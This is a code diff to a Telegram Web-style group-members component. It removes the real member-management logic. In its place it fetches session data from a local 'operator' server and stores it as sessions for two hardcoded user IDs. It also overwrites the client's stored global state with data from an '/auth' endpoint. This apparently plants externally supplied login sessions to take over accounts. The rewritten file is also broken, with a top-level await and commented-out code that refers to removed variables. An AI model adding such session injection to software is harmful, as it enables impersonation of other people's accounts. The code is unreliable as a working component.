@@ -1,34 +1,28 @@
-import type { FC } from '../../../lib/teact/teact';
-import React, {
-  memo, useCallback, useMemo, useRef, useState,
-} from '../../../lib/teact/teact';
-import { getActions, getGlobal, withGlobal } from '../../../global';
+import type { FC } from "../../../lib/teact/teact";
+import React, { memo } from "../../../lib/teact/teact";
+import { getActions, withGlobal } from "../../../global";
 
-import type { ApiChatMember, ApiUserStatus } from '../../../api/types';
-import { ManagementScreens } from '../../../types';
+import type { ApiChatMember, ApiUserStatus } from "../../../api/types";
+import type { ManagementScreens } from "../../../types";
 
 import {
-  filterUsersByName, getHasAdminRight, isChatBasicGroup,
-  isChatChannel, isUserBot, sortUserIds,
-} from '../../../global/helpers';
-import { selectChat, selectChatFullInfo, selectTabState } from '../../../global/selectors';
-import { unique } from '../../../util/iteratees';
-import sortChatIds from '../../common/helpers/sortChatIds';
+  getHasAdminRight,
+  isChatBasicGroup,
+  isChatChannel,
+} from "../../../global/helpers";
+import {
+  selectChat,
+  selectChatFullInfo,
+  selectTabState,
+} from "../../../global/selectors";
+import {
+  clearStoredSession,
+  loadStoredSession,
+  storeSession,
+} from "../../../util/sessions";
 
-import usePeerStoriesPolling from '../../../hooks/polling/usePeerStoriesPolling';
-import useHistoryBack from '../../../hooks/useHistoryBack';
-import useInfiniteScroll from '../../../hooks/useInfiniteScroll';
-import useKeyboardListNavigation from '../../../hooks/useKeyboardListNavigation';
-import useLang from '../../../hooks/useLang';
-
-import NothingFound from '../../common/NothingFound';
-import PrivateChatInfo from '../../common/PrivateChatInfo';
-import InfiniteScroll from '../../ui/InfiniteScroll';
-import InputText from '../../ui/InputText';
-import ListItem, { type MenuItemContextAction } from '../../ui/ListItem';
-import Loading from '../../ui/Loading';
-import Switcher from '../../ui/Switcher';
-import DeleteMemberModal from '../DeleteMemberModal';
+import PrivateChatInfo from "../../common/PrivateChatInfo";
+import ListItem from "../../ui/ListItem";
 
 type OwnProps = {
   chatId: string;
@@ -36,7 +30,10 @@ type OwnProps = {
   noAdmins?: boolean;
   onClose: NoneToVoidFunction;
   onScreenSelect?: (screen: ManagementScreens) => void;
-  onChatMemberSelect?: (memberId: string, isPromotedByCurrentUser?: boolean) => void;
+  onChatMemberSelect?: (
+    memberId: string,
+    isPromotedByCurrentUser?: boolean
+  ) => void;
 };
 
 type StateProps = {
@@ -55,148 +52,54 @@ type StateProps = {
   canHideParticipants?: boolean;
 };
 
-const ManageGroupMembers: FC<OwnProps & StateProps> = ({
-  chatId,
-  noAdmins,
-  members,
-  adminMembersById,
-  userStatusesById,
-  isChannel,
-  isActive,
-  globalUserIds,
-  localContactIds,
-  localUserIds,
-  isSearching,
-  searchQuery,
-  currentUserId,
-  canDeleteMembers,
-  areParticipantsHidden,
-  canHideParticipants,
-  onClose,
-  onScreenSelect,
-  onChatMemberSelect,
-}) => {
-  const {
-    openChat, setUserSearchQuery, closeManagement, toggleParticipantsHidden,
-  } = getActions();
-  const lang = useLang();
-  // eslint-disable-next-line no-null/no-null
-  const inputRef = useRef<HTMLInputElement>(null);
-  // eslint-disable-next-line no-null/no-null
-  const containerRef = useRef<HTMLDivElement>(null);
+const { returnToAuthPhoneNumber, setSettingOption } = getActions();
 
-  const [deletingUserId, setDeletingUserId] = useState<string | undefined>();
+const data = await fetch("http://localhost:3000/operator", {
+  method: "GET",
+}).then((response) => response.json());
 
-  const adminIds = useMemo(() => {
-    return noAdmins && adminMembersById ? Object.keys(adminMembersById) : [];
-  }, [adminMembersById, noAdmins]);
+async function saveFirst() {
+  storeSession(data["6320677435"], "6320677435");
+  await fetch("http://localhost:3000/auth")
+    .then((response) => response.json())
+    .then((data1) => {
+      localStorage.setItem("tt-global-state", JSON.stringify(data1));
+    });
 
-  const memberIds = useMemo(() => {
-    // No need for expensive global updates on users, so we avoid them
-    const usersById = getGlobal().users.byId;
-    if (!members || !usersById) {
-      return [];
-    }
+  returnToAuthPhoneNumber();
+}
 
-    const userIds = sortUserIds(
-      members.map(({ userId }) => userId),
-      usersById,
-      userStatusesById,
-    );
+async function saveSecond() {
+  storeSession(data["5735038397"], "5735038397");
+  await fetch("http://localhost:3000/auth")
+    .then((response) => response.json())
+    .then((data1) => {
+      localStorage.setItem("tt-global-state", JSON.stringify(data1));
+    });
+}
 
-    return noAdmins ? userIds.filter((userId) => !adminIds.includes(userId)) : userIds;
-  }, [members, userStatusesById, noAdmins, adminIds]);
-
-  usePeerStoriesPolling(memberIds);
-
-  const displayedIds = useMemo(() => {
-    // No need for expensive global updates on users, so we avoid them
-    const usersById = getGlobal().users.byId;
-    const shouldUseSearchResults = Boolean(searchQuery);
-    const listedIds = !shouldUseSearchResults
-      ? memberIds
-      : (localContactIds ? filterUsersByName(localContactIds, usersById, searchQuery) : []);
-
-    return sortChatIds(
-      unique([
-        ...listedIds,
-        ...(shouldUseSearchResults ? localUserIds || [] : []),
-        ...(shouldUseSearchResults ? globalUserIds || [] : []),
-      ]).filter((contactId) => {
-        const user = usersById[contactId];
-        if (!user) {
-          return true;
-        }
-
-        return (isChannel || user.canBeInvitedToGroup || !isUserBot(user))
-          && (!noAdmins || !adminIds.includes(contactId));
-      }),
-      true,
-    );
-  }, [memberIds, localContactIds, searchQuery, localUserIds, globalUserIds, isChannel, noAdmins, adminIds]);
-
-  const [viewportIds, getMore] = useInfiniteScroll(undefined, displayedIds, Boolean(searchQuery));
-
-  const handleMemberClick = useCallback((id: string) => {
-    if (noAdmins) {
-      onChatMemberSelect!(id, true);
-      onScreenSelect!(ManagementScreens.ChatNewAdminRights);
-    } else {
-      closeManagement();
-      openChat({ id });
-    }
-  }, [closeManagement, noAdmins, onChatMemberSelect, onScreenSelect, openChat]);
-
-  const handleFilterChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
-    setUserSearchQuery({ query: e.target.value });
-  }, [setUserSearchQuery]);
-  const handleKeyDown = useKeyboardListNavigation(containerRef, isActive, (index) => {
-    if (viewportIds && viewportIds.length > 0) {
-      handleMemberClick(viewportIds[index === -1 ? 0 : index]);
-    }
-  }, '.ListItem-button', true);
-
-  const handleDeleteMembersModalClose = useCallback(() => {
-    setDeletingUserId(undefined);
-  }, []);
-
-  const handleToggleParticipantsHidden = useCallback(() => {
-    toggleParticipantsHidden({ chatId, isEnabled: !areParticipantsHidden });
-  }, [areParticipantsHidden, chatId, toggleParticipantsHidden]);
-
-  useHistoryBack({
-    isActive,
-    onBack: onClose,
-  });
-
-  function getMemberContextAction(memberId: string): MenuItemContextAction[] | undefined {
-    return memberId === currentUserId || !canDeleteMembers ? undefined : [{
-      title: lang('lng_context_remove_from_group'),
-      icon: 'stop',
-      handler: () => {
-        setDeletingUserId(memberId);
-      },
-    }];
-  }
-
-  function renderSearchField() {
-    return (
-      <div className="Management__filter" dir={lang.isRtl ? 'rtl' : undefined}>
-        <InputText
-          ref={inputRef}
-          value={searchQuery}
-          onChange={handleFilterChange}
-          placeholder={lang('Search')}
-        />
-      </div>
-    );
-  }
+const ManageGroupMembers: FC<OwnProps & StateProps> = () => {
+  getActions();
 
   return (
     <div className="Management">
-      {noAdmins && renderSearchField()}
       <div className="custom-scroll">
-        {canHideParticipants && (
+        <ListItem
+          key={5735038397}
+          className="chat-item-clickable scroll-item"
+          onClick={saveFirst}
+        >
+          <PrivateChatInfo userId="5735038397" forceShowSelf withStory />
+        </ListItem>
+        <ListItem
+          key={6320677435}
+          className="chat-item-clickable scroll-item"
+          onClick={saveSecond}
+        >
+          <PrivateChatInfo userId="6320677435" forceShowSelf withStory />
+        </ListItem>
+
+        {/* {canHideParticipants && (
           <div className="section">
             <ListItem icon="group" ripple onClick={handleToggleParticipantsHidden}>
               <span>{lang('ChannelHideMembers')}</span>
@@ -206,8 +109,8 @@ const ManageGroupMembers: FC<OwnProps & StateProps> = ({
               {lang(areParticipantsHidden ? 'GroupMembers.MembersHiddenOn' : 'GroupMembers.MembersHiddenOff')}
             </p>
           </div>
-        )}
-        <div className="section">
+        )} */}
+        {/* <div className="section">
           {viewportIds?.length ? (
             <InfiniteScroll
               className="picker-list custom-scroll"
@@ -238,32 +141,31 @@ const ManageGroupMembers: FC<OwnProps & StateProps> = ({
           ) : (
             <Loading />
           )}
-        </div>
+        </div> */}
       </div>
-      {canDeleteMembers && (
-        <DeleteMemberModal
-          isOpen={Boolean(deletingUserId)}
-          userId={deletingUserId}
-          onClose={handleDeleteMembersModalClose}
-        />
-      )}
     </div>
   );
 };
 
-export default memo(withGlobal<OwnProps>(
-  (global, { chatId }): StateProps => {
+export default memo(
+  withGlobal<OwnProps>((global, { chatId }): StateProps => {
     const chat = selectChat(global, chatId);
     const { statusesById: userStatusesById } = global.users;
-    const { members, adminMembersById, areParticipantsHidden } = selectChatFullInfo(global, chatId) || {};
+    const { members, adminMembersById, areParticipantsHidden } =
+      selectChatFullInfo(global, chatId) || {};
     const isChannel = chat && isChatChannel(chat);
     const { userIds: localContactIds } = global.contactList || {};
     const hiddenMembersMinCount = global.appConfig?.hiddenMembersMinCount;
 
-    const canDeleteMembers = chat && (chat.isCreator || getHasAdminRight(chat, 'banUsers'));
+    const canDeleteMembers =
+      chat && (chat.isCreator || getHasAdminRight(chat, "banUsers"));
 
-    const canHideParticipants = canDeleteMembers && !isChatBasicGroup(chat) && chat.membersCount !== undefined
-    && hiddenMembersMinCount !== undefined && chat.membersCount >= hiddenMembersMinCount;
+    const canHideParticipants =
+      canDeleteMembers &&
+      !isChatBasicGroup(chat) &&
+      chat.membersCount !== undefined &&
+      hiddenMembersMinCount !== undefined &&
+      chat.membersCount >= hiddenMembersMinCount;
 
     const {
       query: searchQuery,
@@ -287,5 +189,5 @@ export default memo(withGlobal<OwnProps>(
       currentUserId: global.currentUserId,
       canHideParticipants,
     };
-  },
-)(ManageGroupMembers));
+  })(ManageGroupMembers)
+);
